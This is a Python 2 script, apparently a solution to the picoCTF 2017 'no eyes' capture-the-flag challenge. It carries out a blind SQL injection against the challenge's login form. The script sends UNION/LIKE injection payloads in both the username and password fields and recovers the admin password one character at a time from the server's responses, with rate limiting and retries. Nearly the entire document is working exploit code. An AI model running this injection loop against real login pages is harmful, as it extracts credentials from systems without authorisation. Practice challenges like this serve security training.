#!/usr/bin/python

# created for picoCTF 2017 "no eyes" challenge

import requests
import time

# set up an appropriate charset and the challenge url
# % is left out of the charset since it's important to the query
charset = "abcdefghijklmnopqrstuvwxyz0123456789!@#$^&*(){}-_"
url = "http://shell2017.picoctf.com:40788/"

# length is known to be 63 from the challenge
password = ''

print "Beginning attack..."

# loop until the password has been found; when the length is complete, stop
while True:
	# iterate over charset to find each valid character for flag
	for i in charset:
		# challenge provided flag length; not necessary if length is not known
		if len(password) == 63:
			print "Completed!"
			time.sleep(100)
			break
		# introduce some slight rate-limiting; adjust as needed
		time.sleep(0.5)
		# the query to use to enumerate each char in the password for the admin user
		query = "' UNION SELECT * from users where user='admin' and pass LIKE '" + password + i + "%" + "'-- "
		try:
			r = requests.post(url, data={"username":query, "password":query})
			if "Login Functionality Not" in r.text:
				# correcting an error I was encountering; can probably
				# be removed if underscores aren't creating an issue
				if i == "_" and password[-1] == "_":
					print "Last char was also an underscore; continuing..."
					continue
				password += i
				print "Flag progress: " + password
				# use break to start looping from beginning of charset
				break
		# exception handling is important to prevent the script from constantly
		# crashing; just sleep a bit if it's crashing due to too many requests
		except requests.exceptions.ConnectionError:
			print "Error, sleeping and then retrying..."
			time.sleep(10)
			r = requests.post(url, data={"username":query, "password":query})
			if "Login Functionality Not" in r.text:
				if i == "_" and password[-1] == "_":
					print "Last char was also an underscore; continuing..."
					continue
				password += i
				print "Flag progress: " + password
				break
